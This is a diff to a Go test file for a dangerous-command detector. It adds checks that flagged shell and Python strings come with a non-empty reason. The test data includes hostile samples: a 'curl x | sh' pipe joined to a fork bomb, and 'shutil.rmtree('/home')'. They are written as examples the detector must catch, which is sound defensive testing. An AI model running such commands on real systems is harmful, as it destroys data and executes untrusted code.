@@ -32,8 +32,8 @@ func TestIsDangerousCommand(t *testing.T) {
 		"curl x | sh; :(){ :|:& };:",
 	}
 	for _, s := range dangerous {
-		if !IsDangerousCommand(s) {
-			t.Errorf("should be dangerous: %q", s)
+		if !IsDangerousCommand(s) || DangerousCommandReason(s) == "" {
+			t.Errorf("should be dangerous with a reason: %q", s)
 		}
 	}
 
@@ -58,7 +58,7 @@ func TestIsDangerousCommand(t *testing.T) {
 		"echo x > /tmp/scratch.txt",
 	}
 	for _, s := range benign {
-		if IsDangerousCommand(s) {
+		if IsDangerousCommand(s) || DangerousCommandReason(s) != "" {
 			t.Errorf("should be benign: %q", s)
 		}
 	}
@@ -77,8 +77,8 @@ func TestIsDangerousPython(t *testing.T) {
 		"shutil.rmtree('/home')",
 	}
 	for _, s := range dangerous {
-		if !IsDangerousPython(s) {
-			t.Errorf("should be dangerous: %q", s)
+		if !IsDangerousPython(s) || DangerousPythonReason(s) == "" {
+			t.Errorf("should be dangerous with a reason: %q", s)
 		}
 	}
 
@@ -93,7 +93,7 @@ func TestIsDangerousPython(t *testing.T) {
 		"open('out.txt', 'w').write('hi')",
 	}
 	for _, s := range benign {
-		if IsDangerousPython(s) {
+		if IsDangerousPython(s) || DangerousPythonReason(s) != "" {
 			t.Errorf("should be benign: %q", s)
 		}
 	}
